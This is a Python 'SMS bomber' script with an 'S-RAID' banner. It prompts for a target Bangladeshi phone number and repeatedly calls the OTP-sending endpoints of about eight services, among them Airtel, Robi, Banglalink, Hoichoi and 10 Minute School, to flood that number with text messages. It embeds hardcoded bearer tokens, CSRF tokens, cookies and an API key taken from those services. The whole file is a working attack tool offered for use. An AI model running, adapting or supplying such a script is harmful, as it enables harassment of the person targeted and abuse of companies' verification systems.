import requests,time,os
logo='''

░██████╗░░░░░░██████╗░░█████╗░██╗██████╗░
██╔════╝░░░░░░██╔══██╗██╔══██╗██║██╔══██╗
╚█████╗░█████╗██████╔╝███████║██║██║░░██║
░╚═══██╗╚════╝██╔══██╗██╔══██║██║██║░░██║
██████╔╝░░░░░░██║░░██║██║░░██║██║██████╔╝
╚═════╝░░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░'''

print(logo)
print("===>Thank you MIZ for your Supports<===")
time.sleep(5)
os.system('clear')
print(logo)
natnumber = str(input("Enter Target Number +880: "))

number = "0"+natnumber

intnumber = "88"+number
plusintnumber="+"+intnumber

count = int(input("How Many SMS ?: "))

def hungry():

	json = {"operationName":"createOtp","query":"mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: \"\"}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n","variables":{"country":"880","deviceBrand":"Firefox","deviceModel":"83","osVersionCode":"Linux armv7l","phone":natnumber,"requestFrom":"U2FsdGVkX185f3yiTmg+qyQ5jzHz54XyLgKbVuqwPbM=","uuid":"064eee1c-fe0a-4f76-abbc-3e9f2acbd901"}}
	link = "https://api-v4-1.hungrynaki.com/graphql"

	x = requests.post(link,json=json)
	print("====>OTP from hungry")
	print(x.text)

def airtel():
	header = {
	"Host": "api.bd.airtel.com",
	"User-Agent": "Mozilla/5.0 (Android 11; Mobile; rv:83.0) Gecko/83.0 Firefox/83.0",
	"Accept": "application/json, text/plain, */*",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate, br",
	"Referer": "https://www.bd.airtel.com/en/auth/login",
	"X-CSRF-TOKEN": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTYyNzY1NjA1NSwiZXhwIjoxNjI3NzQyNDU1LCJuYmYiOjE2Mjc2NTYwNTUsImp0aSI6IlJ0MHFPMll2TVhmMzllUVIiLCJzdWIiOiJBaXJ0ZWwifQ.hwbjXt_q6TL7F4PAyX2rqgBMNbn1BDZChdKi2Ollysw",
	"Content-Type": "application/json;charset=utf-8",
	"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLmJkLmFpcnRlbC5jb21cL3YxXC90b2tlbiIsImlhdCI6MTYyNzY1NjA1NSwiZXhwIjoxNjI3NzQyNDU1LCJuYmYiOjE2Mjc2NTYwNTUsImp0aSI6IlJ0MHFPMll2TVhmMzllUVIiLCJzdWIiOiJBaXJ0ZWwifQ.hwbjXt_q6TL7F4PAyX2rqgBMNbn1BDZChdKi2Ollysw",
	"Content-Length": "30",
	"Origin": "https://www.bd.airtel.com",
	"DNT": "1",
	"Connection": "keep-alive",
	"Pragma": "no-cache",
	"Cache-Control": "no-cache",
			}


	json = {"phone_number":number}
	link = "https://api.bd.airtel.com/v1/account/register/otp"

	x = requests.post(link,json=json,headers=header)
		
	print("====>OTP from airtel")

def robi():
	header = {
		"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvd2ViYXBpLnJvYmkuY29tLmJkXC92MVwvdG9rZW4iLCJpYXQiOjE2Mjc2OTgxNzAsImV4cCI6MTYyNzc4NDU3MCwibmJmIjoxNjI3Njk4MTcwLCJqdGkiOiJydmpNN1pma21aSHVjZEtGIiwic3ViIjoiUm9iaVdlYlNpdGUifQ.J9U_RcwUeaiL3_OhUereycDDpb20VJxuQuIWwWwwDXo"
			}


	json = {"phone_number":number}
	link = "https://webapi.robi.com.bd/v1/account/register/otp"
	x = requests.post(link,json=json,headers=header)
	print("====>OTP from robi")
def bongo():
	link = "https://api2.bongobd.com/api/login/send-otp"

	json ={"msisdn":intnumber,"operator":"all"}

	x = requests.post(link,data=json)
	print("====>OTP from bongo")

	print(x.text)



def bl():
	header = {
			"X-CSRF-Token": "aeb33d77b2715f829e08b66551082c7807d578ea8207a39e48514173dc88c5b94a5d5a24da59735655e41797a268f3a482d710b46d332f312986641caebbb5a6",
			"Cookie": "_gcl_au=1.1.141235444.1627363041; csrfToken=aeb33d77b2715f829e08b66551082c7807d578ea8207a39e48514173dc88c5b94a5d5a24da59735655e41797a268f3a482d710b46d332f312986641caebbb5a6"

			}


	json = {"mobile_num":number}
	link = "https://eselfcare.banglalink.net/home/ajax/otpSignup"
	x = requests.post(link,json=json,headers=header)
	print("====>OTP from bl")
	print(x.text)
def tenmin():
	link = "https://lms.10minuteschool.com/api/v4/auth/sendOtp"

	json = {"contact":"plusintnumber","phone":{"countryCode":"BD","dialCode":"+880","e164Number":"+8801521798713","internationalNumber":"+880 1521-798713","nationalNumber":"01521-798713","number":"1521-798713"},"type":"phone"}

	x = requests.post(link,data=json)
	print("====>OTP from 10minuteschool")
	print(x.text)


def bioscope():
	link="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
	x = requests.get(link)
	print("====>OTP from bioscope")
	print(x.text)

def hoichoi():

  header = {
    "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+88"+number,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  x = requests.post(url, json=data, headers=header)
  if x.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+88"+number,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    x = requests.post(url, json=data, headers=header)
    print("====>OTP from hoichoi")
    print(x.text)

for i in range(count):
	hungry()
	tenmin()
	bioscope()
	hoichoi()
	airtel()
	bl()
	bongo()
	robi()
